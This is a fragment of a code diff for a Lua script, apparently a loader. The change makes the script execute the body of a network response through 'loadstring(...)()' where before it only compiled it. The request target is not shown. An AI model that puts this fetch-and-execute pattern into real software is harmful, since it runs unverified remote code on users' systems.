@@ -10,5 +10,5 @@ local res = req({
 })
 
 if res.Success then
-    loadstring(res.Body)
+    loadstring(res.Body)()
 end
